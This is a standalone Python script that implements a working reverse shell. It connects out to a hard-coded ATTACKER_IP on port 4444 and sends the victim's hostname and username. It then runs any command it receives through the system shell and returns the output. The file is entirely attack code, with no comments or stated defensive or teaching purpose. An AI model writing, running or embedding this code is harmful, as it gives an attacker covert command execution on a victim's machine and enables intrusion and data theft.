import os
import socket
import subprocess
import sys
import time

ATTACKER_IP = "192.168.100.5"
ATTACKER_PORT = 4444

def connect():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        s.send(f"[+] {socket.gethostname()}@{os.getlogin()} connected\n".encode())
        return s
    except:
        return None

def main():
    if sys.platform == "win32":
        import ctypes
        ctypes.windll.kernel32.SetConsoleMode(ctypes.windll.kernel32.GetStdHandle(-11), 7)

    s = None
    for _ in range(5):  
        s = connect()
        if s: break
        time.sleep(2)

    if not s:
        return 

    try:
        while True:
            cmd = s.recv(1024).decode().strip()
            if cmd == "exit":
                break
            elif cmd.startswith("cd "):
                try:
                    os.chdir(cmd[3:])
                    s.send(b"[+] Directory changed\n")
                except Exception as e:
                    s.send(f"[-] {e}\n".encode())
            else:
                try:
                    r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                    s.send((r.stdout or r.stderr or "[+] Done\n").encode())
                except:
                    s.send(b"[-] Command failed\n")
    except:
        pass
    finally:
        s.close()

if __name__ == "__main__":
    main()